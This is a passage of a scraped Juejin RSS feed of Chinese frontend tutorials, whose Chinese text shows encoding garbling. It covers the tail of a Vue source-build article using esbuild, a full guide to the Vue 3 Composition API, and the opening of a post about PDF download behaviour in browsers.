        <span class="hljs-attr">platform</span>: format === <span class="hljs-string">'cjs'</span> ? <span class="hljs-string">'node'</span> : <span class="hljs-string">'browser'</span>,
        plugins,
        <span class="hljs-attr">define</span>: {
            <span class="hljs-attr">__DEV__</span>: prod ? <span class="hljs-string">`false`</span> : <span class="hljs-string">`true`</span>,
        },
    })
    .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">ctx</span> =&gt;</span> ctx.<span class="hljs-title function_">watch</span>())    <span class="hljs-comment">// ç›‘å¬æºç å˜åŒ–å¹¶æ‰§è¡Œå®æ—¶å¢é‡æ„å»º</span>
</code></pre>
<p>å…¶ä¸­æˆ‘ä»¬ä½¿ç”¨äº† NodeJS <code>util</code> åŸç”Ÿæ¨¡å—çš„ <a href="https://link.juejin.cn?target=https%3A%2F%2Fnodejs.org%2Fapi%2Futil.html%23utilparseargsconfig" target="_blank" title="https://nodejs.org/api/util.html#utilparseargsconfig" ref="nofollow noopener noreferrer"><code>parseArgs</code></a> æ¥è§£æå‘½ä»¤è¡Œå‚æ•°ï¼Œä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">node scripts/dev.js -f esm-bundler
</code></pre>
<p>å½“æ‰§è¡Œè¯¥æŒ‡ä»¤æ—¶ï¼Œ<code>parseArgs</code> ä¼šæ•è·ä¼ å…¥çš„ <code>f</code> å‚æ•°å¹¶å°†å…¶å€¼ï¼ˆ<code>esm-bundler</code>ï¼‰èµ‹ç»™ <code>rawFormat</code> å˜é‡ã€‚</p>
<p>æœ€åæˆ‘ä»¬è°ƒç”¨äº† esbuild çš„ <code>context</code> æ–¹æ³•æ¥è‡ªå®šä¹‰é…ç½®å¹¶æ‰§è¡Œæ„å»ºã€‚ä»¥ä¸Šè¿°çš„æŒ‡ä»¤ä¸ºä¾‹ï¼Œesbuild ä¼šç›´æ¥æ„å»ºå‡º <code>packages/shared/dist/shared.esm-bundler.js</code> æ–‡ä»¶ï¼Œä¸”å®æ—¶ç›‘å¬ <code>shared</code> æ¨¡å—çš„æºç å˜åŒ–å¹¶æ‰§è¡Œå¢é‡æ„å»ºã€‚</p>
<blockquote>
<p>ğŸ’¡ Vue æºç åœ¨å¼€å‘è°ƒè¯•ç¯èŠ‚ï¼Œéœ€è¦é€šè¿‡ esbuild æ„å»ºçš„åœºæ™¯å…¶å®ä¸å¤šï¼ˆåœ¨å¼€å‘åæœŸå¯ä»¥åˆ›å»ºä¸€ä¸ª <a href="https://link.juejin.cn?target=https%3A%2F%2Fvite.dev%2F" target="_blank" title="https://vite.dev/" ref="nofollow noopener noreferrer">vite</a> é¡¹ç›®æ¥é…åˆè°ƒè¯•ï¼‰ï¼Œå¼€å‘çš„å‰æœŸæ›´å¤šè¿˜æ˜¯é€šè¿‡ <a href="https://link.juejin.cn?target=https%3A%2F%2Fvitest.dev%2F" target="_blank" title="https://vitest.dev/" ref="nofollow noopener noreferrer">vitest</a> å¯¹æ¨¡å—æºç è¿›è¡Œå•å…ƒæµ‹è¯•ã€‚æˆ‘ä»¬ä¼šåœ¨åç»­çš„æ–‡ç« ä¸­è¿›è¡Œäº†è§£ã€‚</p>
</blockquote>
<p>è¡¥å……ï¼šé‰´äº Vue 3.6 beta 5 å·²å…¨çº¿æ›¿æ¢æ„å»ºå·¥å…·ï¼Œæœ¬æ–‡ã€Œåç»­çš„æ–‡ç« ã€ä¹Ÿåªèƒ½è·Ÿç€æ–­æ›´ã€‚åç»­å¯èƒ½ä»¥ Vue å®˜æ–¹æœ€æ–°ç‰ˆçš„é¡¹ç›®é‡æ–°è¿›è¡Œæºç è§£æå’Œè¾“å‡ºè§£ææ–‡ç« ã€‚å…±å‹‰ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue 3 Composition API å®Œå…¨æŒ‡å—]]></title>    <link>https://juejin.cn/post/7600982613653930034</link>    <guid>https://juejin.cn/post/7600982613653930034</guid>    <pubDate>2026-01-30T14:39:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600982613653930034" data-draft-id="7600990891218812937" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue 3 Composition API å®Œå…¨æŒ‡å—"/> <meta itemprop="keywords" content="Vue.js"/> <meta itemprop="datePublished" content="2026-01-30T14:39:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¥½åå­—_æŠ€æœ¯åˆ†äº«"/> <meta itemprop="url" content="https://juejin.cn/user/1101056944119610"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue 3 Composition API å®Œå…¨æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1101056944119610/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¥½åå­—_æŠ€æœ¯åˆ†äº«
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T14:39:12.000Z" title="Fri Jan 30 2026 14:39:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Vue 3 Composition API å®Œå…¨æŒ‡å—</h2>
<p>Vue 3 çš„ Composition API æ˜¯ä¸€ä¸ªé‡å¤§çš„æ”¹è¿›ï¼Œå®ƒæä¾›äº†æ›´å¥½çš„ä»£ç ç»„ç»‡å’Œå¤ç”¨æ€§ã€‚</p>
<h3 data-id="heading-1">ä»€ä¹ˆæ˜¯ Composition APIï¼Ÿ</h3>
<p>Composition API æ˜¯ä¸€ç§åŸºäºå‡½æ•°çš„ APIï¼Œå…è®¸æˆ‘ä»¬<strong>æŒ‰åŠŸèƒ½ç»„ç»‡ä»£ç </strong>ï¼Œè€Œä¸æ˜¯æŒ‰é€‰é¡¹ã€‚</p>
<h3 data-id="heading-2">åŸºæœ¬ç”¨æ³•</h3>
<h4 data-id="heading-3">setup() å‡½æ•°</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { ref, reactive, computed } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-title function_">setup</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> count = <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>)
    <span class="hljs-keyword">const</span> user = <span class="hljs-title function_">reactive</span>({ <span class="hljs-attr">name</span>: <span class="hljs-string">'å¼ ä¸‰'</span> })

    <span class="hljs-keyword">const</span> doubleCount = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> count.<span class="hljs-property">value</span> * <span class="hljs-number">2</span>)

    <span class="hljs-keyword">function</span> <span class="hljs-title function_">increment</span>(<span class="hljs-params"/>) {
      count.<span class="hljs-property">value</span>++
    }

    <span class="hljs-keyword">return</span> { count, user, doubleCount, increment }
  }
}
</code></pre>
<h4 data-id="heading-4"><code>&lt;script setup&gt;</code> è¯­æ³•ç³–</h4>
<p>Vue 3.2 å¼•å…¥äº† <code>&lt;script setup&gt;</code>ï¼Œè®©ä»£ç æ›´ç®€æ´ï¼š</p>
<pre><code class="hljs language-vue" lang="vue">&lt;script setup&gt;
import { ref, computed } from 'vue'

const count = ref(0)
const doubleCount = computed(() =&gt; count.value * 2)

function increment() {
  count.value++
}
&lt;/script&gt;

&lt;template&gt;
  &lt;div&gt;{{ count }} Ã— 2 = {{ doubleCount }}&lt;/div&gt;
  &lt;button @click="increment"&gt;+1&lt;/button&gt;
&lt;/template&gt;
</code></pre>
<h3 data-id="heading-5">æ ¸å¿ƒ API</h3>
<h4 data-id="heading-6">1. ref å’Œ reactive</h4>
<ul>
<li><code>ref()</code>ï¼šç”¨äºåŸºæœ¬ç±»å‹</li>
<li><code>reactive()</code>ï¼šç”¨äºå¯¹è±¡</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> count = <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>)         <span class="hljs-comment">// åŸºæœ¬ç±»å‹</span>
<span class="hljs-keyword">const</span> state = <span class="hljs-title function_">reactive</span>({    <span class="hljs-comment">// å¯¹è±¡</span>
  <span class="hljs-attr">name</span>: <span class="hljs-string">'Vue'</span>,
  <span class="hljs-attr">version</span>: <span class="hljs-number">3</span>
})
</code></pre>
<h4 data-id="heading-7">2. computed</h4>
<p>è®¡ç®—å±æ€§ï¼Œå…·æœ‰ç¼“å­˜ç‰¹æ€§ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> firstName = <span class="hljs-title function_">ref</span>(<span class="hljs-string">'å¼ '</span>)
<span class="hljs-keyword">const</span> lastName = <span class="hljs-title function_">ref</span>(<span class="hljs-string">'ä¸‰'</span>)

<span class="hljs-keyword">const</span> fullName = <span class="hljs-title function_">computed</span>({
  <span class="hljs-title function_">get</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> firstName.<span class="hljs-property">value</span> + lastName.<span class="hljs-property">value</span>
  },
  <span class="hljs-title function_">set</span>(<span class="hljs-params">value</span>) {
    [firstName.<span class="hljs-property">value</span>, lastName.<span class="hljs-property">value</span>] = value.<span class="hljs-title function_">split</span>(<span class="hljs-string">''</span>)
  }
})
</code></pre>
<h4 data-id="heading-8">3. watch å’Œ watchEffect</h4>
<ul>
<li><code>watch</code>ï¼šç›‘å¬ç‰¹å®šæº</li>
<li><code>watchEffect</code>ï¼šè‡ªåŠ¨è¿½è¸ªä¾èµ–</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> count = <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>)

<span class="hljs-comment">// watchï¼šæŒ‡å®šç›‘å¬æº</span>
<span class="hljs-title function_">watch</span>(count, <span class="hljs-function">(<span class="hljs-params">newVal, oldVal</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`count å˜åŒ–: <span class="hljs-subst">${oldVal}</span> â†’ <span class="hljs-subst">${newVal}</span>`</span>)
})

<span class="hljs-comment">// watchEffectï¼šè‡ªåŠ¨è¿½è¸ª</span>
<span class="hljs-title function_">watchEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`å½“å‰ count: <span class="hljs-subst">${count.value}</span>`</span>)
})
</code></pre>
<h3 data-id="heading-9">ç”Ÿå‘½å‘¨æœŸ</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { onMounted, onUnmounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'ç»„ä»¶å·²æŒ‚è½½'</span>)
})

<span class="hljs-title function_">onUnmounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'ç»„ä»¶å·²å¸è½½'</span>)
})
</code></pre>
<h3 data-id="heading-10">è‡ªå®šä¹‰ Composables</h3>
<p>è¿™æ˜¯ Composition API æœ€å¼ºå¤§çš„ç‰¹æ€§ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// useCounter.js</span>
<span class="hljs-keyword">import</span> { ref } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useCounter</span>(<span class="hljs-params">initialValue = <span class="hljs-number">0</span></span>) {
  <span class="hljs-keyword">const</span> count = <span class="hljs-title function_">ref</span>(initialValue)

  <span class="hljs-keyword">function</span> <span class="hljs-title function_">increment</span>(<span class="hljs-params"/>) { count.<span class="hljs-property">value</span>++ }
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">decrement</span>(<span class="hljs-params"/>) { count.<span class="hljs-property">value</span>-- }
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">reset</span>(<span class="hljs-params"/>) { count.<span class="hljs-property">value</span> = initialValue }

  <span class="hljs-keyword">return</span> { count, increment, decrement, reset }
}

<span class="hljs-comment">// ä½¿ç”¨</span>
<span class="hljs-keyword">import</span> { useCounter } <span class="hljs-keyword">from</span> <span class="hljs-string">'./useCounter'</span>

<span class="hljs-keyword">const</span> { count, increment, decrement, reset } = <span class="hljs-title function_">useCounter</span>(<span class="hljs-number">10</span>)
</code></pre>
<h3 data-id="heading-11">ä¼˜åŠ¿æ€»ç»“</h3>
<p>âœ… <strong>æ›´å¥½çš„ä»£ç ç»„ç»‡</strong>ï¼šæŒ‰åŠŸèƒ½é€»è¾‘åˆ†ç»„
âœ… <strong>æ›´ç®€æ´çš„ç±»å‹æ¨æ–­</strong>ï¼šæ›´å¥½çš„ TypeScript æ”¯æŒ
âœ… <strong>æ›´å¼ºçš„å¤ç”¨æ€§</strong>ï¼šé€šè¿‡ composables å…±äº«é€»è¾‘
âœ… <strong>æ›´çµæ´»çš„æ ‘æ‘‡</strong>ï¼šæœªä½¿ç”¨çš„ä»£ç å¯ä»¥è¢«ä¼˜åŒ–æ‰</p>
<h3 data-id="heading-12">æ€»ç»“</h3>
<p>Composition API æ˜¯ Vue 3 çš„æœªæ¥ï¼Œå®ƒè®©ä»£ç ï¼š</p>
<ul>
<li>æ›´æ¸…æ™°</li>
<li>æ›´æ˜“ç»´æŠ¤</li>
<li>æ›´æ˜“æµ‹è¯•</li>
<li>æ›´æ˜“å¤ç”¨</li>
</ul>
<p>å¦‚æœä½ è¿˜åœ¨ä½¿ç”¨ Options APIï¼Œæ˜¯æ—¶å€™å°è¯• Composition API äº†ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Webæ–‡ä»¶ä¸‹è½½ : ä»PDFé¢„è§ˆBugåˆ°Hookæ¶æ„æ¼”è¿›]]></title>    <link>https://juejin.cn/post/7600982613653946418</link>    <guid>https://juejin.cn/post/7600982613653946418</guid>    <pubDate>2026-01-30T14:54:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600982613653946418" data-draft-id="7601028900885938222" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Webæ–‡ä»¶ä¸‹è½½ : ä»PDFé¢„è§ˆBugåˆ°Hookæ¶æ„æ¼”è¿›"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-30T14:54:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="im_AMBER"/> <meta itemprop="url" content="https://juejin.cn/user/370979729333004"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Webæ–‡ä»¶ä¸‹è½½ : ä»PDFé¢„è§ˆBugåˆ°Hookæ¶æ„æ¼”è¿›
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/370979729333004/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    im_AMBER
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T14:54:54.000Z" title="Fri Jan 30 2026 14:54:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯ AYã€‚</p>
<p>åœ¨ Web å¼€å‘ä¸­ï¼Œä¸‹è½½åŠŸèƒ½çœ‹ä¼¼ç®€å•ï¼Œå´éšè—ç€æµè§ˆå™¨è¡Œä¸ºå·®å¼‚ä¸è·¨åŸŸå®‰å…¨é™åˆ¶çš„é™·é˜±ã€‚</p>
<p>ä»Šå¤©ï¼Œæˆ‘åŸæœ¬åªæƒ³åšä¸€ä¸ªå¯¼å‡ºä¸åŒæ–‡ä»¶æ ¼å¼çš„åŠŸèƒ½ï¼Œå´é‡åˆ°äº†ä¸€ä¸ªbugï¼š<strong>ç”ŸæˆWordæˆ–MDæ–‡ä»¶æ—¶ï¼ŒChromeæµè§ˆå™¨éƒ½ä¼šæ­£å¸¸å¼¹å‡ºä¸‹è½½æ¡†ï¼Œä½†å¯¼å‡ºPDFæ–‡ä»¶æ—¶å´ä¸è¡Œâ€”â€”PDFä¼šç›´æ¥åœ¨å½“å‰é¡µé¢é¢„è§ˆï¼Œçœ‹èµ·æ¥æ˜æ˜æ˜¯è¦ä¸‹è½½PDFï¼Œç»“æœå´ç›´æ¥è¿›å…¥äº†é¢„è§ˆæ¨¡å¼ï¼Œè€Œä¸”æˆ‘åŸæœ¬æ‰“å¼€çš„é¡µé¢è¿˜è¢«è¿™ä¸ªé¢„è§ˆé¡µé¢è¦†ç›–äº†ã€‚</strong></p>
<h2 data-id="heading-0">ä¸€ã€ä¸ºä»€ä¹ˆ PDF ä¼šâ€œä¸è¯·è‡ªæ¥â€åœ°é¢„è§ˆï¼Ÿ</h2>
<h4 data-id="heading-1">1.æµè§ˆå™¨çš„ MIME ç±»å‹ç­–ç•¥</h4>
<p>æµè§ˆå™¨å¦‚ä½•å¤„ç†ä¸€ä¸ª URLï¼Œå–å†³äºæœåŠ¡å™¨è¿”å›çš„ <strong>MIME ç±»å‹ï¼ˆMultipurpose Internet Mail Extensionsï¼‰</strong> ã€‚</p>
<ul>
